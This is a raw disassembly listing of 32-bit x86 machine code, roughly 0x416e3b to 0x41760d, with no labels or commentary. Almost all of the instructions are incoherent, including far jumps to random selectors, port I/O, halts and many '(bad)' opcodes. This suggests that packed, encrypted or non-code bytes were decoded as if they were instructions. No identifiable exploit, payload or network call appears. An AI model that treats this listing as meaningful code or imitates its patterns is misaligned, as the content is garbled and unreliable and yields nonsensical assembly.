  416e3b:	scas   al,BYTE PTR es:[edi]
  416e3c:	mov    ecx,esi
  416e3e:	inc    esi
  416e3f:	call   0x2515b2d9
  416e44:	adc    eax,DWORD PTR [edx]
  416e46:	pop    ebp
  416e47:	adc    al,0x55
  416e49:	xchg   ecx,eax
  416e4a:	push   esp
  416e4b:	mov    dh,ch
  416e4d:	add    eax,0xadf1a6f4
  416e52:	dec    ebp
  416e53:	pop    ss
  416e54:	adc    al,0x87
  416e56:	ins    DWORD PTR es:[edi],dx
  416e57:	pop    es
  416e58:	pop    edi
  416e59:	cmp    al,bh
  416e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e5c:	mov    ah,0x25
  416e5e:	dec    eax
  416e5f:	or     eax,0x2af1c138
  416e64:	test   BYTE PTR [ebx-0x7b73a756],dl
  416e6a:	hlt    
  416e6b:	int3   
  416e6c:	test   DWORD PTR [ebx-0x32],eax
  416e6f:	inc    esi
  416e70:	adc    al,0x98
  416e72:	mov    ds:0x61a56e8b,al
  416e77:	adc    edx,DWORD PTR [edi+0x73931c1c]
  416e7d:	push   esi
  416e7e:	mov    ebp,0x2e390b83
  416e83:	push   esp
  416e84:	pop    ebx
  416e85:	pop    es
  416e86:	or     BYTE PTR [eax+eiz*4+0x31],bl
  416e8a:	mov    DWORD PTR [eax+0x6],ebx
  416e8d:	scas   eax,DWORD PTR es:[edi]
  416e8e:	inc    esi
  416e8f:	xchg   edi,eax
  416e90:	ror    DWORD PTR [ebx+0x7],0x5
  416e94:	mov    ds:0x12b9631f,al
  416e99:	mov    ds:0x3f2851ef,al
  416e9e:	cli    
  416e9f:	jne    0x416e48
  416ea1:	jne    0x416e4b
  416ea3:	push   edx
  416ea4:	test   eax,0xaf533193
  416ea9:	xchg   ecx,eax
  416eaa:	push   0x54
  416eac:	loope  0x416eb1
  416eae:	pusha  
  416eaf:	mov    dl,0xe7
  416eb1:	jmp    0xd299:0x101f8b7
  416eb8:	arpl   WORD PTR [ebp-0x15],ax
  416ebb:	push   esp
  416ebc:	jge    0x416e9c
  416ebe:	retf   0x7727
  416ec1:	mov    dl,0x25
  416ec3:	cmp    eax,edi
  416ec5:	mov    bl,0xa4
  416ec7:	and    al,0xd3
  416ec9:	fisub  WORD PTR [eax+0x58b7d8a1]
  416ecf:	in     eax,0x6e
  416ed1:	mov    bl,0xca
  416ed3:	push   ds
  416ed4:	imul   edx,edx,0xffffffb0
  416ed7:	(bad)  
  416ed8:	in     al,dx
  416ed9:	adc    eax,0x298eec17
  416ede:	popa   
  416edf:	mov    ebp,esp
  416ee1:	(bad)  
  416ee2:	sbb    DWORD PTR [edx],ebp
  416ee4:	mov    dl,0x95
  416ee6:	ja     0x416efa
  416ee8:	outs   dx,BYTE PTR ds:[esi]
  416ee9:	xor    eax,DWORD PTR [ebx+0x16]
  416eec:	jbe    0x416f60
  416eee:	ror    edx,cl
  416ef0:	jnp    0x416eac
  416ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ef3:	or     eax,0xd94968f
  416ef8:	push   cs
  416ef9:	push   es
  416efa:	or     al,0xc8
  416efc:	push   ebp
  416efd:	jne    0x416f71
  416eff:	add    eax,0xb893f644
  416f04:	fcom   st(6)
  416f06:	add    dh,0x9c
  416f09:	out    dx,al
  416f0a:	ret    
  416f0b:	iret   
  416f0c:	push   ecx
  416f0d:	dec    ecx
  416f0e:	mov    edx,0x860d643e
  416f13:	mov    esp,0xe408194d
  416f18:	or     eax,0xe8e21ddf
  416f1d:	cmc    
  416f1e:	cs out 0xaa,eax
  416f21:	pop    ebp
  416f22:	adc    DWORD PTR [ebp-0x3e],ebp
  416f25:	sbb    BYTE PTR [esi+0x107d6380],ah
  416f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f2c:	sbb    DWORD PTR [edi],ebp
  416f2e:	loopne 0x416ef8
  416f30:	stos   BYTE PTR es:[edi],al
  416f31:	outs   dx,BYTE PTR ds:[esi]
  416f32:	lock push ebp
  416f34:	add    al,0x12
  416f36:	xor    DWORD PTR [eax],esp
  416f38:	mov    ebp,0xd81dc0a
  416f3d:	imul   edi,DWORD PTR [eax-0x21de684a],0x6b
  416f44:	rol    DWORD PTR [esi+eax*4+0x10],cl
  416f48:	(bad)  
  416f49:	out    dx,eax
  416f4a:	xor    BYTE PTR [esi+0x6d],0x55
  416f4e:	dec    ecx
  416f4f:	repz fisttp WORD PTR [ebx+0x14463d5]
  416f56:	sub    edi,DWORD PTR ds:0xc34406b0
  416f5c:	pusha  
  416f5d:	jmp    0x5449:0xcbea5a6c
  416f64:	aaa    
  416f65:	and    ch,cl
  416f67:	mov    dl,0x2a
  416f69:	lea    esi,[ebp+0x5b]
  416f6c:	lods   eax,DWORD PTR ds:[esi]
  416f6d:	xor    eax,DWORD PTR [esi]
  416f6f:	pop    edi
  416f70:	mov    al,0x15
  416f72:	shld   DWORD PTR [eax],edi,cl
  416f75:	je     0x416fdb
  416f77:	and    BYTE PTR [eax-0x5e],cl
  416f7a:	jbe    0x416f0f
  416f7c:	push   edx
  416f7d:	lds    ecx,FWORD PTR [esi+0x2b]
  416f80:	jg     0x416f92
  416f82:	dec    ebx
  416f83:	inc    ecx
  416f84:	fbld   TBYTE PTR [ecx-0x1f]
  416f87:	jge    0x416f6d
  416f89:	mov    es,WORD PTR [esi+0x3b6f4539]
  416f8f:	das    
  416f90:	jb     0x416f2c
  416f92:	mov    bh,0x35
  416f94:	or     cl,0x56
  416f97:	cld    
  416f98:	mov    ch,0xc0
  416f9a:	shl    edi,0x4c
  416f9d:	and    al,0xcc
  416fa0:	push   0xaee0df33
  416fa5:	arpl   WORD PTR [edx+0x22],si
  416fa8:	or     bh,BYTE PTR [ebx-0x36]
  416fab:	push   ecx
  416fac:	mov    bl,BYTE PTR [edx+0x78]
  416faf:	sub    DWORD PTR [esp+ebx*2-0xf],edi
  416fb3:	fs push edx
  416fb5:	and    bh,BYTE PTR [eax+0x6df2ff31]
  416fbb:	mov    ds:0xae94c778,al
  416fc0:	repz aam 0x8d
  416fc3:	call   0x83f7815b
  416fc8:	popf   
  416fc9:	and    eax,0x627c496e
  416fce:	and    eax,0x3fd6f47a
  416fd3:	inc    ebx
  416fd4:	retf   
  416fd5:	(bad)  
  416fd6:	adc    ecx,ebp
  416fd8:	add    DWORD PTR [eax],esi
  416fda:	aaa    
  416fdb:	mov    edi,0xccf0362
  416fe0:	fimul  WORD PTR [esp+eiz*4+0x5a]
  416fe4:	sub    bh,BYTE PTR [edx+0x53996910]
  416fea:	push   ecx
  416feb:	repnz sub BYTE PTR [ebx+0x21],ah
  416fef:	cld    
  416ff0:	sub    dh,0x7a
  416ff3:	cvttps2pi mm6,QWORD PTR [ecx]
  416ff6:	cld    
  416ff7:	add    al,0x4
  416ff9:	jle    0x416fe3
  416ffb:	dec    edi
  416ffc:	stos   BYTE PTR es:[edi],al
  416ffd:	test   BYTE PTR [ecx+0x24c32a3c],dl
  417003:	jg     0x417012
  417005:	mov    bh,0x51
  417007:	les    esi,FWORD PTR [eax-0x2b59f668]
  41700d:	or     bh,bh
  41700f:	test   eax,0x7d23d543
  417014:	bound  edx,QWORD PTR [ebx+ebp*2]
  417017:	jmp    0xd45f:0x53f19aad
  41701e:	xchg   esi,eax
  41701f:	out    dx,al
  417020:	dec    ebp
  417021:	jb     0x417088
  417023:	fadd   QWORD PTR [ebx-0x43]
  417026:	sub    al,0xdb
  417028:	sbb    al,0xa
  41702a:	mov    bl,0xe
  41702c:	sbb    dh,dh
  41702e:	pop    ecx
  41702f:	push   eax
  417030:	mov    ecx,0x5c5e7715
  417035:	mov    DWORD PTR [esi+0x7bce7a3b],eax
  41703b:	test   DWORD PTR [edi+0x28],edi
  41703e:	mov    ecx,0x3eceadf0
  417043:	ficom  DWORD PTR [ebp-0x41]
  417046:	mov    al,es:0xd3a2ea2
  41704c:	fldcw  WORD PTR [edi+ebp*2+0x7b9c0430]
  417053:	cmp    ah,BYTE PTR [eax+ebx*1-0x169b23b6]
  41705a:	arpl   WORD PTR [esi-0x7d],si
  41705d:	lods   eax,DWORD PTR ds:[esi]
  41705e:	add    BYTE PTR [ecx],dl
  417060:	jmp    0xe591:0x9fcbce4f
  417067:	imul   dh
  417069:	inc    edx
  41706a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41706b:	jae    0x41701d
  41706d:	cmp    DWORD PTR [eax+0xbc2e647],edi
  417073:	dec    edi
  417074:	add    al,BYTE PTR [edi]
  417076:	(bad)  
  417077:	mov    ecx,0xd45499d5
  41707c:	xchg   esp,eax
  41707d:	pop    edi
  41707e:	mov    bl,0xbd
  417080:	retf   
  417081:	mov    dh,0xfc
  417083:	sbb    cl,ch
  417085:	retf   
  417086:	fsub   st(0),st
  417088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417089:	jns    0x41709f
  41708b:	mov    dh,0xbd
  41708d:	aad    0xa9
  41708f:	popa   
  417090:	adc    dl,BYTE PTR [edi+0x23]
  417093:	iret   
  417094:	out    dx,al
  417095:	popf   
  417096:	cdq    
  417097:	je     0x41710b
  417099:	adc    ebp,DWORD PTR [eax]
  41709b:	ret    
  41709c:	sbb    BYTE PTR [edi-0xd],ch
  41709f:	xchg   edx,eax
  4170a0:	js     0x4170b3
  4170a2:	dec    eax
  4170a3:	std    
  4170a4:	cmp    BYTE PTR [ebp+0x0],0x61
  4170a8:	add    al,0x56
  4170aa:	fwait
  4170ab:	pop    edi
  4170ac:	pusha  
  4170ad:	mov    ecx,0x23380706
  4170b2:	jl     0x417129
  4170b4:	pop    eax
  4170b5:	cmp    ch,ah
  4170b7:	jmp    0x417112
  4170b9:	add    al,0x13
  4170bb:	mov    edx,0x2d3cb938
  4170c0:	xor    bl,BYTE PTR [edx]
  4170c2:	jp     0x417103
  4170c4:	push   ebx
  4170c5:	mov    ds:0x515bd21a,eax
  4170ca:	pop    ebx
  4170cb:	add    DWORD PTR [ecx],edx
  4170cd:	sbb    dh,cl
  4170cf:	pop    esp
  4170d0:	out    dx,al
  4170d1:	or     DWORD PTR [edi+0x62],ebx
  4170d4:	pop    esi
  4170d5:	xchg   edi,eax
  4170d6:	xchg   edi,eax
  4170d7:	pop    eax
  4170d8:	sbb    BYTE PTR [ebx],al
  4170da:	aas    
  4170db:	mov    dh,0x9d
  4170dd:	jns    0x4170fc
  4170df:	ja     0x4170e7
  4170e1:	inc    ecx
  4170e2:	sub    eax,0x375ad480
  4170e7:	sar    edi,cl
  4170e9:	and    al,0xa0
  4170eb:	ja     0x4170af
  4170ed:	mov    WORD PTR [esp+esi*8-0x3e04afc8],es
  4170f4:	fadd   QWORD PTR [edi-0x22]
  4170f7:	pop    edx
  4170f8:	fist   DWORD PTR [esi+eax*8-0x29]
  4170fc:	loop   0x4170f6
  4170fe:	jecxz  0x417176
  417100:	jns    0x41715c
  417102:	add    esp,DWORD PTR [eax]
  417104:	add    al,0x46
  417106:	ins    DWORD PTR es:[edi],dx
  417107:	repz jno 0x417101
  41710a:	inc    esi
  41710b:	(bad)  
  41710c:	fild   QWORD PTR [ebp+0x209779d8]
  417112:	mov    esi,0x4979ef63
  417117:	mov    edx,0x44946661
  41711c:	pop    ebp
  41711d:	aam    0x87
  41711f:	aam    0x50
  417121:	js     0x41713c
  417123:	leave  
  417124:	aas    
  417125:	fldenv [ecx-0x2df1e605]
  41712b:	inc    esp
  41712c:	pop    ecx
  41712d:	fidiv  DWORD PTR [edx]
  41712f:	dec    ecx
  417130:	out    dx,al
  417131:	cmp    BYTE PTR [ebx-0x306d2817],ah
  417137:	mov    esi,DWORD PTR [edx-0x1]
  41713a:	mov    dh,0xc
  41713c:	push   0xffffff92
  41713e:	in     al,dx
  41713f:	and    eax,0x7cc4f098
  417144:	in     al,dx
  417145:	and    al,0x19
  417147:	ja     0x41712e
  417149:	ficomp DWORD PTR [ecx-0xe20e84]
  41714f:	sub    eax,0x28dedb0f
  417154:	fld    DWORD PTR [edi]
  417156:	mov    BYTE PTR [edx-0x7f11a8fe],dl
  41715c:	das    
  41715d:	das    
  41715e:	jno    0x417177
  417160:	jnp    0x417142
  417162:	ins    BYTE PTR es:[edi],dx
  417163:	imul   BYTE PTR [edx]
  417165:	sar    edx,0xe5
  417168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417169:	jmp    0x41711e
  41716b:	xchg   edi,eax
  41716c:	mov    ds:0x620bf7cd,al
  417171:	rcr    BYTE PTR [edi+0x31],cl
  417174:	mov    ebp,0x11e400f5
  417179:	scas   al,BYTE PTR es:[edi]
  41717a:	sti    
  41717b:	jge    0x4171aa
  41717d:	adc    eax,esi
  41717f:	dec    ebp
  417180:	out    0xf9,eax
  417182:	ror    BYTE PTR [esi-0x6b],cl
  417185:	adc    edi,0x9541ce0e
  41718b:	pop    eax
  41718c:	out    dx,eax
  41718d:	nop
  41718e:	push   esp
  41718f:	mov    gs,WORD PTR [ecx-0x58ec499b]
  417195:	mov    WORD PTR [edi],ds
  417197:	cld    
  417198:	outs   dx,BYTE PTR ds:[esi]
  417199:	cmp    BYTE PTR ds:0x5f8363c2,ch
  41719f:	ins    BYTE PTR es:[edi],dx
  4171a0:	pop    ds
  4171a1:	xor    al,0x7
  4171a3:	scas   al,BYTE PTR es:[edi]
  4171a4:	or     ebp,DWORD PTR [ebp+0x4b1ad6cf]
  4171aa:	mov    BYTE PTR [ebx],bh
  4171ac:	add    al,0xc
  4171ae:	ror    DWORD PTR [ebx-0x68],1
  4171b1:	jge    0x41717d
  4171b3:	sub    eax,DWORD PTR [eax-0x5]
  4171b6:	aam    0x1b
  4171b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171b9:	js     0x4171e8
  4171bb:	xlat   BYTE PTR ds:[ebx]
  4171bc:	xlat   BYTE PTR ds:[ebx]
  4171bd:	mov    al,0xfe
  4171bf:	cwde   
  4171c0:	ja     0x417215
  4171c2:	mov    dl,dh
  4171c4:	arpl   WORD PTR [esi],ax
  4171c6:	adc    eax,0xcb4af2de
  4171cb:	add    BYTE PTR [esi-0x86ed18a],bl
  4171d1:	add    BYTE PTR [esi-0x5d1b90cc],dh
  4171d7:	push   ecx
  4171d8:	test   al,0x30
  4171da:	xchg   ebp,eax
  4171db:	je     0x4171ca
  4171dd:	sbb    BYTE PTR ss:[eax+0x13],al
  4171e1:	fdiv   QWORD PTR [edi+0x11a20371]
  4171e7:	inc    ebx
  4171e8:	bound  ebx,QWORD PTR [eax]
  4171ea:	fist   DWORD PTR [esi+ebx*8+0x5d7be753]
  4171f1:	aam    0x1e
  4171f3:	sub    ebx,DWORD PTR [esp+ebx*1]
  4171f6:	and    ebp,DWORD PTR [esi]
  4171f8:	push   0xffffff8d
  4171fa:	adc    BYTE PTR [ebx],0x0
  4171fd:	xchg   DWORD PTR [esi-0x11252374],edx
  417203:	jne    0x4171ce
  417205:	in     al,0x6a
  417207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417208:	out    0x18,eax
  41720a:	jmp    0x409c29cc
  41720f:	push   es
  417210:	xor    BYTE PTR [eax],ch
  417212:	call   0x47a3d8c7
  417217:	mov    bl,0x4a
  417219:	ror    eax,1
  41721b:	outs   dx,DWORD PTR ds:[esi]
  41721c:	imul   esi,DWORD PTR [esi-0x6bc26c02],0xb5d4426c
  417226:	std    
  417227:	jmp    0x106e80a9
  41722c:	popf   
  41722d:	jnp    0x4171be
  41722f:	jg     0x41729a
  417231:	scas   eax,DWORD PTR es:[edi]
  417232:	rcr    DWORD PTR [edx-0x30],cl
  417235:	test   eax,0xa2c17e2d
  41723a:	mov    al,ds:0x2f540161
  41723f:	adc    esp,DWORD PTR [edx-0x78]
  417242:	repz push ebx
  417244:	popa   
  417245:	ins    DWORD PTR es:[edi],dx
  417246:	xchg   edx,eax
  417247:	in     al,0xf7
  417249:	xchg   edi,eax
  41724a:	ret    0xed51
  41724d:	leave  
  41724e:	mov    BYTE PTR [ecx+0x32],cl
  417251:	dec    ebp
  417252:	adc    ch,cl
  417254:	lahf   
  417255:	xor    DWORD PTR [esi-0x61098503],edx
  41725b:	outs   dx,DWORD PTR ds:[esi]
  41725c:	scas   al,BYTE PTR es:[edi]
  41725d:	aad    0xce
  41725f:	iret   
  417260:	pop    es
  417261:	addr16 cmc 
  417263:	dec    ebx
  417264:	xchg   esp,eax
  417265:	xchg   esi,eax
  417266:	jge    0x41728d
  417268:	ins    BYTE PTR es:[edi],dx
  417269:	fisttp QWORD PTR [ebx+0x1e]
  41726c:	cmc    
  41726d:	jecxz  0x4172a9
  41726f:	push   esi
  417270:	cmpxchg DWORD PTR [ebx],ebx
  417273:	std    
  417274:	cmp    ecx,DWORD PTR ds:[edi]
  417277:	xchg   ecx,eax
  417278:	cmp    DWORD PTR [ebx+0x2ba4b76],esp
  41727e:	ja     0x4172a4
  417280:	jns    0x417251
  417282:	or     al,0x44
  417284:	jne    0x417258
  417286:	pop    ds
  417287:	loope  0x41727c
  417289:	(bad)  
  41728b:	push   ds
  41728c:	push   edi
  41728d:	jmp    0xcf2:0x10730834
  417294:	push   cs
  417295:	jmp    0x5aa2ce6a
  41729a:	rol    BYTE PTR [ecx+0x4],cl
  41729d:	add    edx,esi
  41729f:	ins    BYTE PTR es:[edi],dx
  4172a0:	bound  ecx,QWORD PTR [esi+0x61]
  4172a3:	or     ebp,DWORD PTR [ebp-0x5c]
  4172a6:	jmp    0xfece:0xfa2af48c
  4172ad:	mov    WORD PTR [ecx+0x3423941b],cx
  4172b4:	aad    0xd7
  4172b6:	and    al,0x80
  4172b8:	mov    esi,0x4827c546
  4172bd:	xchg   ecx,eax
  4172be:	sub    eax,0x912df5fa
  4172c3:	inc    ebx
  4172c4:	out    dx,al
  4172c5:	popf   
  4172c6:	xchg   ebx,eax
  4172c7:	cmp    al,0x79
  4172c9:	push   0x7c
  4172cb:	(bad)  
  4172cc:	jo     0x4172a9
  4172ce:	xchg   ebx,eax
  4172cf:	add    DWORD PTR [ebp-0x169b9bfb],esi
  4172d5:	pop    edi
  4172d6:	loopne 0x4172ea
  4172d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172d9:	mov    eax,ebx
  4172db:	enter  0x3681,0x17
  4172df:	mov    ds:0xd8c2d69b,eax
  4172e4:	std    
  4172e5:	pop    esp
  4172e6:	(bad)  
  4172e8:	sub    DWORD PTR [esi],esp
  4172ea:	jmp    0x4878:0xc3ebbcd
  4172f1:	retf   
  4172f2:	cmp    bl,ch
  4172f4:	call   0xc7f8:0x34efc502
  4172fb:	cmp    DWORD PTR [ebx],ecx
  4172fd:	jmp    0x4172f1
  4172ff:	in     al,dx
  417300:	mov    ebp,0x5cd6a7b2
  417305:	rol    DWORD PTR [edi-0x5985dd5f],1
  41730b:	cwde   
  41730c:	call   0x9b27:0xcedc34f2
  417313:	jbe    0x4172d9
  417315:	mov    cl,0xfe
  417317:	xlat   BYTE PTR ds:[ebx]
  417318:	sub    DWORD PTR [ecx],ecx
  41731a:	cs mov bh,0xce
  41731d:	push   ss
  41731e:	and    DWORD PTR [edi+ebx*1],eax
  417321:	sub    al,0x50
  417323:	xchg   ebx,eax
  417324:	inc    edx
  417325:	test   edi,esp
  417327:	fisubr DWORD PTR [ebx-0x1b]
  41732a:	cwde   
  41732b:	mov    cl,0x34
  41732d:	and    eax,0xfb57465f
  417332:	popa   
  417333:	xchg   esi,eax
  417334:	jge    0x417367
  417336:	jnp    0x417319
  417338:	out    dx,eax
  417339:	jne    0x4172ec
  41733b:	adc    ecx,DWORD PTR [ecx]
  41733d:	loopne 0x4172f4
  41733f:	pop    edx
  417340:	imul   ebx,DWORD PTR [ebx-0x7508ee08],0xffffff90
  417347:	mov    dl,0x99
  417349:	outs   dx,DWORD PTR ds:[esi]
  41734a:	out    dx,eax
  41734b:	jmp    FWORD PTR [ebx+edx*2]
  41734e:	dec    eax
  41734f:	mov    edi,0x528e9870
  417354:	adc    BYTE PTR [esi+0x6],0x4f
  417358:	jbe    0x4173bf
  41735a:	ja     0x41735a
  41735c:	mov    esp,0x241d98dc
  417361:	mov    ds:0x1335fc45,eax
  417366:	in     eax,0x70
  417368:	int    0xe0
  41736a:	or     eax,DWORD PTR [esi-0x7ab97c3]
  417370:	pop    ebp
  417371:	sub    edi,DWORD PTR [edi+0x49]
  417374:	add    DWORD PTR [eax],ebp
  417376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417377:	xor    BYTE PTR [esi],0x57
  41737a:	mov    eax,0xd3485a7c
  41737f:	iret   
  417380:	jg     0x4173f5
  417382:	and    BYTE PTR [ebx+0x27bf95fa],bl
  417388:	mov    ds:0xb23bcc35,al
  41738d:	push   eax
  41738e:	(bad)
  417392:	icebp  
  417393:	jns    0x4173a4
  417395:	cs sub esi,ebx
  417398:	into   
  417399:	inc    DWORD PTR [esi+edx*8+0x17]
  41739d:	adc    edx,DWORD PTR [edi+0x72]
  4173a0:	clc    
  4173a1:	scas   al,BYTE PTR es:[edi]
  4173a2:	mov    cl,0xa5
  4173a4:	cdq    
  4173a5:	sbb    DWORD PTR [esi+0x6e],0x906a6119
  4173ac:	cli    
  4173ad:	mov    edi,0xedbe42e5
  4173b2:	inc    ecx
  4173b3:	mov    al,ds:0xb2738350
  4173b8:	rol    BYTE PTR [esi],cl
  4173ba:	daa    
  4173bb:	and    BYTE PTR [edx],0x4d
  4173be:	mov    ebp,DWORD PTR [esi-0x82f0273]
  4173c4:	sub    al,0xb3
  4173c6:	fstp   st(3)
  4173c8:	inc    ebx
  4173c9:	jecxz  0x417416
  4173cb:	call   0x34c31ea1
  4173d0:	xchg   ecx,eax
  4173d1:	lock in al,0xc9
  4173d4:	jb     0x41737b
  4173d6:	test   al,0xff
  4173d8:	sahf   
  4173d9:	mov    ds:0xcfb4d637,eax
  4173de:	es je  0x4173d6
  4173e1:	mov    es,WORD PTR [edi-0x76]
  4173e4:	dec    eax
  4173e5:	push   ds
  4173e6:	nop
  4173e7:	sbb    al,cl
  4173e9:	es test eax,0x229891e0
  4173ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173f0:	mov    dl,0x30
  4173f2:	div    bl
  4173f4:	lods   al,BYTE PTR ds:[esi]
  4173f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173f6:	and    DWORD PTR ds:0x35a1505a,ebp
  4173fc:	xor    eax,0xe4b9ba97
  417401:	popa   
  417402:	sub    ebp,eax
  417404:	loope  0x417400
  417406:	jmp    0x4173c8
  417408:	leave  
  417409:	cmp    ebp,esp
  41740b:	shl    BYTE PTR [eax+ebp*1+0x70],0x83
  417410:	fimul  DWORD PTR [esi-0x19]
  417413:	ret    
  417414:	mov    ah,0xe9
  417416:	es stos BYTE PTR es:[edi],al
  417418:	adc    al,0xb0
  41741a:	bound  edi,QWORD PTR [ebx-0x7a4f62d3]
  417420:	cwde   
  417421:	fsubr  DWORD PTR [edi-0x31ca224b]
  417427:	clc    
  417428:	sub    ebx,ecx
  41742a:	mov    ecx,0xdd1ffe7
  41742f:	mov    bl,0xc5
  417431:	xchg   edx,eax
  417432:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417434:	jne    0x4173c4
  417436:	adc    DWORD PTR [ebx],eax
  417438:	mov    ds:0x32931331,al
  41743d:	push   edi
  41743e:	test   DWORD PTR [esi+0x5b],edi
  417441:	aam    0xc2
  417443:	loopne 0x41745c
  417445:	fild   DWORD PTR [edi-0x3dc51ebf]
  41744b:	mov    BYTE PTR ds:0x4bae51a8,cl
  417451:	(bad)  
  417453:	xor    eax,0x96d3cb20
  417458:	nop    ebp
  41745b:	jnp    0x4174a4
  41745d:	pop    edx
  41745e:	jmp    esp
  417460:	sub    BYTE PTR [ebp+0x64],cl
  417463:	mov    BYTE PTR [esp+edi*1+0x39],dl
  417467:	sbb    eax,0x99d47174
  41746c:	pop    ds
  41746d:	das    
  41746e:	push   ds
  41746f:	sub    ebp,esi
  417471:	pushf  
  417472:	mov    al,ds:0x3aa33c3d
  417477:	xchg   edi,eax
  417478:	xchg   edx,eax
  417479:	nop
  41747a:	xor    eax,0x922f5796
  41747f:	xor    ch,dl
  417481:	pop    es
  417482:	adc    al,BYTE PTR [edi-0x6d987a23]
  417488:	aam    0x19
  41748a:	(bad)  [ecx-0x7d9ed489]
  417490:	pop    esi
  417491:	jmp    0x41750e
  417493:	aam    0xcf
  417495:	test   BYTE PTR [ebx],ah
  417497:	cdq    
  417498:	and    esp,DWORD PTR [edi+0x6230a9b4]
  41749e:	je     0x4174a2
  4174a0:	test   al,0x2b
  4174a2:	cmp    ebx,edx
  4174a4:	mov    edi,0xfa23b6ba
  4174a9:	int    0x82
  4174ab:	xor    BYTE PTR [esi+0x1083ecad],cl
  4174b1:	sub    al,0x5
  4174b3:	mov    edx,0x7a6cd8b4
  4174b8:	leave  
  4174b9:	data16 jne 0x4174d0
  4174bc:	inc    eax
  4174bd:	iret   
  4174be:	pop    ecx
  4174bf:	in     eax,dx
  4174c0:	mov    edx,?
  4174c2:	int3   
  4174c3:	loope  0x4174cb
  4174c5:	cmp    al,dl
  4174c7:	aad    0xe9
  4174c9:	mov    es,WORD PTR [ebp-0x18]
  4174cc:	or     ebx,DWORD PTR [edx+0x7058ab4a]
  4174d2:	ds add esp,eax
  4174d5:	add    cl,ah
  4174d7:	iret   
  4174d8:	scas   eax,DWORD PTR es:[edi]
  4174d9:	pop    edi
  4174da:	mov    al,ds:0xdac0450d
  4174df:	call   0xc4b3327d
  4174e4:	frstor ds:0xb0099cfa
  4174ea:	jge    0x4174ef
  4174ec:	clc    
  4174ed:	jg     0x417515
  4174ef:	inc    esp
  4174f0:	in     al,0x48
  4174f2:	mov    al,ds:0xbc914a51
  4174f7:	xchg   ebp,esp
  4174f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174fa:	xor    al,0x30
  4174fc:	cmc    
  4174fd:	(bad)  
  4174fe:	leave  
  4174ff:	out    0x6b,eax
  417501:	fstp   QWORD PTR [edi]
  417503:	jbe    0x4174b4
  417505:	aam    0xa7
  417507:	test   DWORD PTR [edi-0x79c36f5c],ebp
  41750d:	cli    
  41750e:	ret    0x19f2
  417511:	aas    
  417512:	mov    al,ds:0x442efe27
  417517:	(bad)  
  417518:	xor    edx,esi
  41751a:	cs jp  0x417576
  41751d:	cmc    
  41751e:	lock add BYTE PTR [edi],bh
  417521:	mul    ebx
  417523:	sbb    ecx,edx
  417525:	ds or  ah,bh
  417528:	mov    edx,0x9d813631
  41752d:	inc    esi
  41752e:	clc    
  41752f:	xor    BYTE PTR [esi],0x50
  417532:	out    dx,eax
  417533:	jo     0x41759c
  417535:	push   ebx
  417536:	ja     0x4174b9
  417538:	xchg   BYTE PTR [esi-0x360b80d2],ah
  41753e:	push   ecx
  41753f:	pop    ds
  417540:	xor    DWORD PTR [ecx],edi
  417542:	push   ecx
  417543:	xchg   ebp,eax
  417544:	xchg   edx,eax
  417545:	inc    esi
  417546:	push   ss
  417547:	xor    eax,0xdaa94a7a
  41754c:	jno    0x4175b9
  41754e:	ficomp WORD PTR [ebp+0x49962797]
  417554:	aad    0x60
  417556:	push   cs
  417557:	lods   al,BYTE PTR ds:[esi]
  417558:	dec    edx
  417559:	pop    es
  41755a:	mov    BYTE PTR [esi-0x5159f1d2],ch
  417560:	aad    0x8
  417562:	xor    dh,BYTE PTR [esi-0xb]
  417565:	jp     0x417506
  417567:	out    0x78,al
  417569:	mov    DWORD PTR [ecx-0x6c],esp
  41756c:	cmp    ch,0xec
  41756f:	loope  0x417545
  417571:	jg     0x4175ce
  417573:	mov    eax,0x37462b22
  417578:	(bad)  
  417579:	imul   edi,esi,0xb69a83a
  41757f:	jecxz  0x417558
  417581:	(bad)  
  417582:	mov    edi,DWORD PTR [ebp-0x42c8b38e]
  417588:	mov    ?,WORD PTR [edi]
  41758a:	sbb    cl,BYTE PTR [edx]
  41758c:	nop
  41758d:	ds ret 
  41758f:	inc    ecx
  417590:	test   BYTE PTR es:[edi+0x7f89dec2],bl
  417597:	test   DWORD PTR [ecx-0x3aae2b5d],esi
  41759d:	adc    BYTE PTR [eax-0x35],al
  4175a0:	inc    ecx
  4175a1:	jne    0x4175a8
  4175a3:	adc    al,0x95
  4175a5:	ss xchg esi,eax
  4175a7:	jmp    0x4175d7
  4175a9:	lods   al,BYTE PTR ds:[esi]
  4175aa:	mov    ecx,0xf9e5c8ac
  4175af:	dec    esi
  4175b0:	test   eax,0x6cfbd4d9
  4175b5:	pushf  
  4175b6:	mov    cl,0x64
  4175b8:	cs nop
  4175ba:	repnz xor DWORD PTR [ebp-0x46],0xba128ed
  4175c2:	mov    dl,bl
  4175c4:	jo     0x4175e8
  4175c6:	mov    gs,WORD PTR [eax+0x6b37eebf]
  4175cc:	or     DWORD PTR [ebx],ebp
  4175ce:	sar    BYTE PTR [esi+ebx*8+0x5498ae2d],0xa3
  4175d6:	mov    dl,BYTE PTR [eax+0x52]
  4175d9:	add    dh,BYTE PTR [ebp-0x4b]
  4175dc:	mov    al,ds:0xaf61e689
  4175e1:	mov    al,ds:0xc85893cb
  4175e6:	mov    BYTE PTR [ebx-0x77ad89c],al
  4175ec:	out    0x79,eax
  4175ee:	call   0x9fb2:0x921e660f
  4175f5:	stc    
  4175f6:	(bad)  
  4175f7:	(bad)  [esi]
  4175f9:	push   edi
  4175fa:	jo     0x4175e4
  4175fc:	mov    bl,BYTE PTR cs:[edi+0x5c]
  417600:	sub    DWORD PTR [eax],0xffffffb9
  417603:	jbe    0x4175e1
  417605:	inc    ecx
  417606:	adc    BYTE PTR [ebx],ch
  417608:	test   eax,0x7809873e
  41760d:	sar    ecx,1
